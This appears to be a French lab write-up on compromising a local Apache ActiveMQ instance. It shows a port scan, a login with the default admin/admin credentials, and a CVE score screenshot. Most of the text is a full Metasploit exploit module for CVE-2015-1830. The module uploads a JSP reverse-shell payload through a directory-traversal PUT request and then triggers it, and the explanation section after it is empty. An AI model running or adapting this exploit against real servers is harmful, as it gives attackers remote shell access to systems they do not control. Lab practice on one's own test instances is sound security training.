## ActiveMQ_2015

### Scan du réseau
Dans le cas d'ActiveMQ_2015 l'adresse ip est 172.18.0.1
![Capture d'écran 2024-10-01 121316](https://github.com/user-attachments/assets/8d40d00b-0967-452f-8e6e-0fdf3dcc81e7)

Grace à notre scan on en déduit que le port qui nous intéresse est le 8161.
Pour se rediriger sur le site le lien est donc `http://localhost:8161`

### Version d'ActiveMQ 
Pour savoir la version il faut se connecter:  
- Login: admin
- Mot de passe: admin
![Capture d'écran 2024-10-01 115916](https://github.com/user-attachments/assets/1cc0ec1d-9c63-4438-8c34-dd006a92ac7b)

### CVE Score
![Capture d'écran 2024-10-01 121800](https://github.com/user-attachments/assets/0566d3f7-64a6-470f-9ca1-1b5049191008)

### Stratégie de compromission

# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework


class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability (CVE-2015-1830) in Apache
        ActiveMQ 5.x before 5.11.2 for Windows.

        The module tries to upload a JSP payload to the /admin directory via the traversal
        path /fileserver/..\\admin\\ using an HTTP PUT request with the default ActiveMQ
        credentials admin:admin (or other credentials provided by the user). It then issues
        an HTTP GET request to /admin/<payload>.jsp on the target in order to trigger the
        payload and obtain a shell.
      },
      'Author'          =>
        [
          'David Jorm',     # Discovery and exploit
          'Erik Wynter'     # @wyntererik - Metasploit
        ],
      'References'     =>
        [
          [ 'CVE', '2015-1830' ],
          [ 'EDB', '40857'],
          [ 'URL', 'https://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt' ]
        ],
      'Privileged'     => false,
      'Platform'    => %w{ win },
      'Targets'     =>
        [
          [ 'Windows Java',
            {
              'Arch' => ARCH_JAVA,
              'Platform' => 'win'
            }
          ],
        ],
      'DisclosureDate' => '2015-08-19',
      'License'        => MSF_LICENSE,
      'DefaultOptions'  => {
        'RPORT' => 8161,
        'PAYLOAD' => 'java/jsp_shell_reverse_tcp'
        },
      'DefaultTarget'  => 0))

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to the web application', '/']),
      OptString.new('PATH',      [true, 'Traversal path', '/fileserver/..\\admin\\']),
      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with', 'admin'])
    ])
  end

  def check
    print_status("Running check...")
    testfile = Rex::Text::rand_text_alpha(10)
    testcontent = Rex::Text::rand_text_alpha(10)

    send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, datastore['PATH'], "#{testfile}.jsp"),
      'headers'     => {
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
        },
      'method'    => 'PUT',
      'data'      => "<% out.println(\"#{testcontent}\");%>"
    })

    res1 = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path,"admin/#{testfile}.jsp"),
      'headers'     => {
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
        },
      'method'    => 'GET'
    })

    if res1 && res1.body.include?(testcontent)
      send_request_cgi(
        opts = {
          'uri'       => normalize_uri(target_uri.path,"admin/#{testfile}.jsp"),
          'headers'     => {
            'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
            },
          'method'    => 'DELETE'
        },
        timeout = 1
      )
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Uploading payload...")
    testfile = Rex::Text::rand_text_alpha(10)
    vprint_status("If upload succeeds, payload will be available at #{target_uri.path}admin/#{testfile}.jsp") #This information is provided to allow for manual execution of the payload in case the upload is successful but the GET request issued by the module fails.

    send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, datastore['PATH'], "#{testfile}.jsp"),
      'headers'     => {
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
        },
      'method'    => 'PUT',
      'data'      => payload.encoded
    })

    print_status("Payload sent. Attempting to execute the payload.")
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path,"admin/#{testfile}.jsp"),
      'headers'     => {
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
      },
      'method'    => 'GET'
    })
    if res && res.code == 200
      print_good("Payload executed!")
    else
      fail_with(Failure::PayloadFailed, "Failed to execute the payload")
    end
  end
end
            

### Exploitation/Explication
